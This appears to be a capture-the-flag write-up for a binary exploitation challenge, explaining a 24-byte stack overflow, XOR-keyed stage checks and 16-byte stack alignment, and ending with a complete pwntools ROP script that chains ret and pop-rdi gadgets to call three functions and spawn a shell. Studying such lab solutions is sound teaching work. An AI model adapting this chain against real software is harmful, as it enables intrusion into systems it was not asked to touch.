# CTF Writeup: Multi-Stage ROP (chall)

## Challenge Overview
**Challenge:** chall
**Category:** Pwn / Binary Exploitation
**Objective:** Pass three sequential stages (`execute_stage1`, `execute_stage2`, `get_flag`) by calculating dynamic keys and bypassing stack alignment checks.

## 1. Analysis
The binary uses a global `stage_key` variable that updates after every successful function call. We must call three functions in order, passing the correct XORed key as an argument to each.

### Vulnerability
The `vulnerable` function has a buffer overflow:
* Buffer: 16 bytes
* Read: 256 bytes (`0x100`)
* **Offset:** 24 bytes (16 buffer + 8 saved RBP)

### The Stages
1.  **`execute_stage1(arg)`**
    * Requires: `arg == current_key ^ 0xcafebabe`
    * Updates key to `0xcafebabe`
2.  **`execute_stage2(arg)`**
    * Requires: `arg == current_key ^ 0xf00dbabe`
    * Updates key to `0xf00dbabe`
3.  **`get_flag(arg)`**
    * Requires: `arg == current_key ^ 0x12345678`
    * Spawns shell.

## 2. Stack Alignment (The "RET" Gadget)
This challenge explicitly checks for stack alignment (`check_alignment` function) and crashes if the stack pointer (`RSP`) is not a multiple of 16.

### The Core Problem: The CPU is Picky
Modern 64-bit processors (x86_64) process data in **16-byte chunks** for speed (using instructions like `MOVAPS`). 
* If data on the stack isn't aligned to a 16-byte boundary (address ending in `0`), these instructions crash the program.

### The Rule (System V ABI)
The Linux ABI requires that **`RSP` be 16-byte aligned before a `call` instruction**.

#### Normal Execution (Safe)
1.  **Before `call`:** `RSP` is aligned (ends in `0`).
2.  **`call function`:** Pushes Return Address (8 bytes). `RSP` ends in `8`.
3.  **Function Prologue:** `push rbp` (8 bytes). `RSP` ends in `0`.
4.  **Result:** Alignment is restored inside the function!

#### ROP Execution (Crash)
When we overwrite the stack and jump directly to a function (skipping `call`), we break this cycle.
1.  We jump to `execute_stage1` directly. The "Return Address" was never pushed.
2.  The function executes `push rbp`.
3.  **Result:** The stack is now off by 8 bytes (misaligned). Any subsequent aligned instruction will crash the program.

### The Fix: The "Dummy" RET
We insert a **`ret` gadget** before our function call.
* `ret` simply pops 8 bytes off the stack.
* This shifts `RSP` by 8 bytes, manually simulating the alignment change that `call` would have done.
* **Misaligned (Ends in 8) -> `ret` -> Aligned (Ends in 0)**.

## 3. Exploit Script
```python
from pwn import *

# 1. Setup
exe = './chall'
elf = ELF(exe)
context.binary = exe

# p = remote('IP', PORT)
p = process(exe)

# 2. Addresses
pop_rdi = 0x401565
addr_stage1 = elf.symbols['execute_stage1'] # 0x4012a3
addr_stage2 = elf.symbols['execute_stage2'] # 0x40131a
addr_flag   = elf.symbols['get_flag']       # 0x4013b6
ret_gadget  = 0x401566 # Simple ret for alignment

# 3. Parse the Leak
p.recvuntil(b'Current stage key: ')
leak = p.recvline().strip()
current_key = int(leak, 16)
log.info(f"Leaked Initial Key: {hex(current_key)}")

# 4. Calculate Arguments
# Stage 1: arg = Key ^ 0xcafebabe
arg1 = current_key ^ 0xcafebabe

# Stage 2: arg = NewKey (0xcafebabe) ^ 0xf00dbabe
arg2 = 0xcafebabe ^ 0xf00dbabe

# Stage 3: arg = NewKey (0xf00dbabe) ^ 0x12345678
arg3 = 0xf00dbabe ^ 0x12345678

# 5. Build ROP Chain
padding = b'A' * 24
chain = padding

# -- Stage 1 --
# Add 'ret' gadget to align stack (shifts RSP by 8 bytes)
chain += p64(ret_gadget) 
chain += p64(pop_rdi)
chain += p64(arg1)
chain += p64(addr_stage1)

# -- Stage 2 --
chain += p64(ret_gadget)
chain += p64(pop_rdi)
chain += p64(arg2)
chain += p64(addr_stage2)

# -- Get Flag --
chain += p64(ret_gadget)
chain += p64(pop_rdi)
chain += p64(arg3)
chain += p64(addr_flag)

# 6. Send
p.sendlineafter(b'Input: ', chain)
p.interactive()
```
